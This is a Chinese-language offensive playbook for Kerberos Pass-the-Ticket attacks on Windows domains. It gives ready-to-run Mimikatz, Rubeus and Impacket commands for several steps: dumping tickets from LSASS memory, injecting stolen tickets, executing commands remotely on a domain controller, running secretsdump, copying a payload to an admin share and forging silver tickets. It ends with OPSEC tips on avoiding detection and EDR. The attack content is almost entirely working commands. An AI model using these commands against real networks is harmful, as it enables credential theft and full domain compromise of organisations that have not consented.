# 票据传递（Pass-the-Ticket）攻击工作流程

## 工作流程 1：Mimikatz 票据提取与注入

### 步骤 1：从 LSASS 导出票据
```powershell
# 从内存转储所有 Kerberos 票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# 列出导出的 .kirbi 文件
dir *.kirbi

# 识别高价值票据（域管理员 TGT）
# 查找：[0;xxxxx]-2-0-40e10000-administrator@krbtgt-DOMAIN.LOCAL.kirbi
```

### 步骤 2：将票据注入会话
```powershell
# 清除现有票据
mimikatz.exe "kerberos::purge" "exit"

# 或使用 klist
klist purge

# 导入被盗票据
mimikatz.exe "kerberos::ptt [0;xxxxx]-2-0-40e10000-administrator@krbtgt-DOMAIN.LOCAL.kirbi" "exit"

# 验证票据已加载
klist
```

### 步骤 3：访问资源
```powershell
# 以被模拟用户身份访问文件共享
dir \\dc01.domain.local\c$

# 远程执行命令
PsExec.exe \\dc01.domain.local cmd.exe

# 访问管理共享
copy payload.exe \\dc01.domain.local\c$\windows\temp\
```

## 工作流程 2：Rubeus 票据操作

### 转储与注入
```powershell
# 转储所有票据（需要本地管理员权限）
.\Rubeus.exe dump

# 转储指定 LUID 的票据
.\Rubeus.exe dump /luid:0x3e4

# 提取当前用户的 TGT（无需管理员权限）
.\Rubeus.exe tgtdeleg

# 从 Base64 注入票据
.\Rubeus.exe ptt /ticket:doIFmjCC...base64ticket...

# 创建带票据的牺牲进程
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ptt /ticket:base64ticket
```

## 工作流程 3：基于 Linux 的票据传递（Impacket）

### 转换与使用票据
```bash
# 将 .kirbi 转换为 .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# 设置票据环境变量
export KRB5CCNAME=ticket.ccache

# 配合 Impacket 工具使用
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-smbexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-wmiexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-secretsdump -k -no-pass domain.local/administrator@dc01.domain.local

# 列出可访问的共享
impacket-smbclient -k -no-pass domain.local/administrator@dc01.domain.local
```

## 工作流程 4：银票据（Silver Ticket）（伪造 TGS）
```powershell
# 使用 Mimikatz 创建银票据（需要服务账户 NTLM 哈希）
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:NTLM_HASH /ptt" "exit"

# 使用 Rubeus 创建银票据
.\Rubeus.exe silver /service:cifs/server.domain.local /rc4:NTLM_HASH /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /ptt
```

## 作战安全（OPSEC）注意事项

1. 被盗票据有效期有限（TGT 默认 10 小时）
2. 从不同 IP 重用 TGT 可能触发高级检测
3. 银票据完全绕过 KDC - 更难被检测
4. 在 Rubeus 中使用 createnetonly 以避免覆盖合法票据
5. 注意可能保护 Kerberos 票据的 Credential Guard
6. 部分 EDR 解决方案会监控票据注入行为
